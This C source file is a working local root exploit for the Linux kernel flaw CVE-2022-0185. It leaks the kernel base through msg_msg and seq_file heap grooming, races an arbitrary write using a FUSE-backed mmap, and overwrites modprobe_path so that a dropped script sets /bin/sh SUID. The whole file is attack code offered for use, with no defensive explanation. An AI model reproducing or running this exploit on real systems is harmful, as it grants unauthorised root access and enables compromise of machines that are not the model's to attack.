#define _GNU_SOURCE
// clang-format off
#define FUSE_USE_VERSION 34  // ! MUST
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>

#include <fuse.h>
#include <errno.h>
#include <fcntl.h>
#include <stddef.h>
#include <assert.h>

#include <pthread.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/stat.h>

#include <unistd.h>
// clang-format on

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_DEFAULT "\033[0m"

#define DMSG(fmt, ...) fprintf(stderr, "[*]\t" fmt "\n", ##__VA_ARGS__)

#define IMSG(fmt, ...) \
  fprintf(stderr, COLOR_GREEN "[+]\t" fmt "\n" COLOR_DEFAULT, ##__VA_ARGS__)

#define EMSG(fmt, ...) \
  fprintf(stderr, COLOR_RED "[-]\t" fmt "\n" COLOR_DEFAULT, ##__VA_ARGS__)

#define fatal(fmt, ...)       \
  do {                        \
    EMSG(fmt, ##__VA_ARGS__); \
    exit(EXIT_FAILURE);       \
  } while (0)

uint64_t user_cs, user_ss, user_rflags, user_rsp;

void debug(void);
void hexdump(const void *, uint64_t);
void save_status(void);

static void spawn_shell(void);

void bind_core(int);
void setup_sandbox();

#define SEQ_NUMS 100
#define MSG_QUEUE_NUM 100
#define MSG_TYPE 0x41
#define PAGE_SIZE 0x1000
#define SEQ_SIZE 0x20
#define PRIMARY_MSG_SIZE (0x1000 - 0x30 + 0x20 - 0x8)

struct list_head {
  uint64_t next;
  uint64_t prev;
};

struct msg_msg {
  struct list_head m_list;
  uint64_t m_type;
  uint64_t m_ts;
  uint64_t next;
  uint64_t security;
};

struct msg_msgseg {
  uint64_t next;
};

struct {
  long msgtyp;
  char mtext[PRIMARY_MSG_SIZE];
} primary_msg;

int make_msg_queue(void);
int recv_msg(int msqid, void *msgp, size_t msgsz, long msgtyp);
int send_msg(int msqid, void *msgp, size_t msgsz, long msgtyp);
int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp);
void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev,
               uint64_t m_type, uint64_t m_ts, uint64_t next,
               uint64_t security);
void delete_msg_queue(int msqid, int cmd, struct msqid_ds *buf);

static int evil_getattr(const char *path, struct stat *stbuf,
                        struct fuse_file_info *fi);

static int evil_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
                        off_t offset, struct fuse_file_info *fi,
                        enum fuse_readdir_flags flags);
static int evil_read(const char *path, char *buf, size_t size, off_t offset,
                     struct fuse_file_info *fi);

// fuse_main(args.argc, args.argv, &evil_fuse_ops, NULL);
#define EVIL_MOUNT_PATH "evil"
#define EVIL_FILE_NAME "evil"
static struct fuse_operations evil_fuse_ops = {
    .readdir = evil_readdir,
    .getattr = evil_getattr,
    .read = evil_read,
};
char *evil_args[] = {"exploit", EVIL_MOUNT_PATH, NULL};

uint64_t raw_kbase = 0xffffffff81000000;
uint64_t kbase;
uint64_t koffset;
uint64_t mp_offset = 0xffffffff8286c140 - 0xffffffff81000000;
uint64_t modprobe_path;

const char *modprobe_root = "/tmp/root";
const char *modprobe_trigger = "/tmp/trigger";
#define SHELL "/bin/sh"

int fs_fd;
int seq_fd[SEQ_NUMS];
int msqid[MSG_QUEUE_NUM];
int fuse_pipes[2];

uint64_t check_kbase(char *buf);
void bypass_kaslr(void);
void modprobe_init(void);
void trigger_modprobe(void);
void *arb_write(void *);
void win(void);

#ifndef __NR_fsconfig
#define __NR_fsconfig 431
#endif
#ifndef __NR_fsopen
#define __NR_fsopen 430
#endif
#define FSCONFIG_SET_STRING 1
#define fsopen(name, flags) syscall(__NR_fsopen, name, flags)
#define fsconfig(fd, cmd, key, value, aux) \
  syscall(__NR_fsconfig, fd, cmd, key, value, aux)

int main(int argc, char **argv) {
  IMSG("========== CVE-2022-0185... ==========");

  evil_args[0] = argv[0];
  save_status();
  setup_sandbox();
  bind_core(0);

  mkdir(EVIL_MOUNT_PATH, 0777);
  pipe(fuse_pipes);
  modprobe_init();

  if (!fork()) {
    fuse_main(sizeof(evil_args) / sizeof(char *) - 1, evil_args, &evil_fuse_ops,
              NULL);
  }
  while (!kbase) {
    bypass_kaslr();
  }
  modprobe_path = kbase + mp_offset;
  DMSG("kernel base => %#lx", kbase);
  DMSG("modprobe_path => %#lx", modprobe_path);

  while (1) {
    win();
    trigger_modprobe();
    struct stat check;
    if (stat(SHELL, &check) < 0) {
      fatal("Error on checking");
    }
    if (check.st_mode & S_ISUID) {
      break;
    }
  }

  puts("[*] Exploit success! " SHELL " is SUID now!");
  return EXIT_SUCCESS;
}

uint64_t check_kbase(char *buf) {
  /*
    pwndbg> p &single_start
    $2 = (void *(*)(struct seq_file *, loff_t *)) 0xffffffff81338400
    pwndbg> kbase Found virtual base address: 0xffffffff81000000
    pwndbg> p/x 0xffffffff81338400-0xffffffff81000000
    $3 = 0x338400
*/
  uint64_t kbase = ((uint64_t *)buf)[510] - 0x338400;
  if (kbase & 0x1fffff || kbase == 0 ||
      (kbase & (0xfffffful << 40)) != ((0xfffffful << 40))) {
    return 0;
  }
  return kbase;
}

void bypass_kaslr() {
  IMSG("========= BYPASS KASLR ==========");

  char buffer[0x2000];
  const char *pad = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
  assert(strlen(pad) == 33);

  for (int i = 0; i < MSG_QUEUE_NUM; i++) {
    if ((msqid[i] = make_msg_queue()) < 0) {
      fatal("Error msgget");
    }
  }

  DMSG("Prepare half msg & seq_file ops");
  for (int i = 0; i < (MSG_QUEUE_NUM / 2); ++i) {
    memset(primary_msg.mtext, 0x63, PRIMARY_MSG_SIZE);
    send_msg(msqid[i], &primary_msg, sizeof(primary_msg), MSG_TYPE);
  }

  DMSG("Prepare fs: write 4995 = 35 * 117");
  fs_fd = fsopen("ext4", 0);
  if (fs_fd < 0) {
    fatal("Error fsopen ext4");
  }

  for (int i = 0; i < 117; i++) {
    fsconfig(fs_fd, FSCONFIG_SET_STRING, "\x00", pad, 0);
  }

  DMSG("Spray other msg & seq_file op");
  for (int i = (MSG_QUEUE_NUM / 2); i < MSG_QUEUE_NUM; ++i) {
    memset(primary_msg.mtext, 0x61, PRIMARY_MSG_SIZE);
    send_msg(msqid[i], &primary_msg, sizeof(primary_msg), MSG_TYPE);
    if ((seq_fd[i] = open("/proc/self/stat", O_RDONLY)) == -1) {
      fatal("Error seq open");
    }
  }
  for (int i = 0; i < (MSG_QUEUE_NUM / 2); ++i) {
    if ((seq_fd[i] = open("/proc/self/stat", O_RDONLY)) == -1) {
      fatal("Error seq open");
    }
  }

  DMSG("Overflow FS to change msg->m_ts");
  // ,key=value 4096:, 4097=
  // pad: 0x18-1-2 = 0x15 = 21
  fsconfig(fs_fd, FSCONFIG_SET_STRING, "\x00", "aaaaaaaaaaaaaaaaaaaaa", 0);
  // m_ts: 0x1080
  fsconfig(fs_fd, FSCONFIG_SET_STRING, "\x00", "\x80\x10", 0);

  DMSG("Peek msg to read seq_file op");

  kbase = 0;
  for (int i = 0; i < MSG_QUEUE_NUM; ++i) {
    uint64_t sz;
    memset(buffer, 0, sizeof(buffer));
    if ((sz = peek_msg(msqid[i], buffer, 0x1080, 0)) < 0) {
      fatal("Error peek msg");
    }
    kbase = check_kbase(buffer);
    if (kbase) {
      close(fs_fd);
      break;
    }
    // if (sz == 0x1080) {
    //   hexdump(buffer + PRIMARY_MSG_SIZE, 0x200);
    // }
  }
}

void *arb_write(void *args) {
  uint64_t goal = modprobe_path - 8;
  char pat[0x1000] = {0};
  char evil[0x20];

  memset(pat, 0x41, 29);  
  memcpy(evil, (void *)&goal, 8);
  fsconfig(fs_fd, FSCONFIG_SET_STRING, "\x00", pat, 0);
  fsconfig(fs_fd, FSCONFIG_SET_STRING, "\x00", evil, 0);
  DMSG("Done heap overflow");
  write(fuse_pipes[1], "A", 1);
}

void win() {
  int size = 0x1000;
  char buffer[0x2000] = {0};
  char pat[0x1000] = {0};
  struct msg_buf *message = (struct msg_buf *)&buffer;
  memset(buffer, 0x44, sizeof(buffer));

  void *evil_page = mmap((void *)0x1337000, 0x1000, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);
  uint64_t race_page = 0x1338000;

  size = 0x1010;

  int target = make_msg_queue();
  send_msg(target, &message, size, MSG_TYPE);

  DMSG("Opening ext4 filesystem");
  fs_fd = fsopen("ext4", 0);
  if (fs_fd < 0) {
    fatal("Opening");
  }
  DMSG("Overflowing...");
  strcpy(pat, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");
  for (int i = 0; i < 117; i++) {
    fsconfig(fs_fd, FSCONFIG_SET_STRING, "\x00", pat, 0);
  }

  DMSG("Prepaing fault handlers via FUSE");
  int evil_fd = open("evil/evil", O_RDWR);
  if (evil_fd < 0) {
    perror("evil fd failed");
    exit(-1);
  }
  if ((mmap((void *)0x1338000, 0x1000, PROT_READ | PROT_WRITE,
            MAP_SHARED | MAP_FIXED, evil_fd, 0)) != (void *)0x1338000) {
    fatal("mmap fail fuse 1");
  }

  pthread_t thread;
  int race = pthread_create(&thread, NULL, arb_write, NULL);
  if (race != 0) {
    perror("can't setup threads for race");
  }
  send_msg(target, (void *)(race_page - 8), size - 0x30, 0);
  pthread_join(thread, NULL);
  munmap((void *)0x1337000, 0x1000);
  munmap((void *)0x1338000, 0x1000);
  close(evil_fd);
  close(fs_fd);
}

void modprobe_init() {
  char filename[65];
  int fd;

  memset(filename, 0, sizeof(filename));
  fd = open(modprobe_trigger, O_RDWR | O_CREAT);
  if (fd < 0) {
    fatal("trigger creation failed");
  }
  const char bad_header[] = "\xff\xff\xff\xff";
  write(fd, bad_header, sizeof(bad_header));
  close(fd);
  chmod(modprobe_trigger, 0777);

  fd = open(modprobe_root, O_RDWR | O_CREAT);
  if (fd < 0) {
    fatal("modprobe winner creation failed");
  }
  const char payload[] = "#!/bin/sh\nchmod u+s " SHELL "\n";
  write(fd, payload, sizeof(payload));
  close(fd);
  chmod(modprobe_root, 0777);
}

void trigger_modprobe() {
  IMSG("Attempting to trigger modprobe");
  execve(modprobe_trigger, NULL, NULL);
}

void debug() {
  DMSG("\t=============\tDEBUG\t=========");
  getchar();
}

void save_status() {
  asm volatile(
      "movq %%cs, %0;"
      "movq %%ss, %1;"
      "movq %%rsp, %3;"
      "pushfq;"
      "pop %2;"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
      :
      : "memory");
  DMSG("Save status");
}

void bind_core(int core) {
  cpu_set_t cpu_set;

  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
  DMSG("Spin core%d", core);
}

void hexdump(const void *data, uint64_t size) {
  char ascii[17];
  uint64_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char *)data)[i]);
    if (((unsigned char *)data)[i] >= ' ' &&
        ((unsigned char *)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char *)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i + 1) % 8 == 0 || i + 1 == size) {
      printf(" ");
      if ((i + 1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i + 1 == size) {
        ascii[(i + 1) % 16] = '\0';
        if ((i + 1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i + 1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
}

void setup_sandbox() {
  int fd;
  char edit[0x100];
  // 用于创建一个新的进程命名空间
  unshare(CLONE_NEWNS | CLONE_NEWUSER);
  // 用于在Linux系统中修改进程的用户和组映射信息，从而实现用户和组的身份变更。
  // /proc/self/setgroups文件用于控制进程是否允许修改所在组的列表
  fd = open("/proc/self/setgroups", O_WRONLY);
  write(fd, "deny", strlen("deny"));
  close(fd);
  // /proc/self/uid_map文件用于设置进程在用户命名空间中的UID映射。这里将UID映射设置为将用户的"0"映射为给定的uid值。
  fd = open("/proc/self/uid_map", O_WRONLY);
  snprintf(edit, sizeof(edit), "0 %d 1", getuid());
  write(fd, edit, strlen(edit));
  close(fd);
  // /proc/self/gid_map文件用于设置进程在用户命名空间中的GID映射。这里将GID映射设置为将组的"0"映射为给定的gid值。
  fd = open("/proc/self/gid_map", O_WRONLY);
  snprintf(edit, sizeof(edit), "0 %d 1", getpid());
  write(fd, edit, strlen(edit));
  close(fd);

  DMSG("Set up sandbox");
}

int make_msg_queue(void) { return msgget(IPC_PRIVATE, 0666 | IPC_CREAT); }

int recv_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  return msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp, 0);
}

int send_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  ((struct msgbuf *)msgp)->mtype = msgtyp;
  return msgsnd(msqid, msgp, msgsz - sizeof(long), 0);
}

int peek_msg(int msqid, void *msgp, size_t msgsz, long msgtyp) {
  return msgrcv(msqid, msgp, msgsz - sizeof(long), msgtyp,
                MSG_COPY | IPC_NOWAIT | MSG_NOERROR);
}

void build_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev,
               uint64_t m_type, uint64_t m_ts, uint64_t next,
               uint64_t security) {
  msg->m_list.next = m_list_next;
  msg->m_list.prev = m_list_prev;
  msg->m_type = m_type;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = security;  // 设置为 0
}

void delete_msg_queue(int msqid, int cmd, struct msqid_ds *buf) {
  if ((msgctl(msqid, cmd, buf)) == -1) {
    fatal("delete msg queue fail");
  }
}

static int evil_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
                        off_t offset, struct fuse_file_info *fi,
                        enum fuse_readdir_flags flags) {
  if (strcmp(path, "/") != 0) return -ENOENT;

  filler(buf, ".", NULL, 0, 0);
  filler(buf, "..", NULL, 0, 0);
  filler(buf, EVIL_FILE_NAME, NULL, 0, 0);

  return 0;
}

static int evil_getattr(const char *path, struct stat *stbuf,
                        struct fuse_file_info *fi) {
  (void)fi;
  int res = 0;

  memset(stbuf, 0, sizeof(struct stat));
  if (strcmp(path, "/") == 0) {
    stbuf->st_mode = S_IFDIR | 0755;
    stbuf->st_nlink = 2;
  } else if (strcmp(path + 1, EVIL_FILE_NAME) == 0) {
    stbuf->st_mode = S_IFREG | 0444;
    stbuf->st_nlink = 1;
    stbuf->st_size = 0x1000;
  } else
    res = -ENOENT;

  return res;
}

static int evil_read(const char *path, char *buf, size_t size, off_t offset,
                     struct fuse_file_info *fi) {
  return 0;
}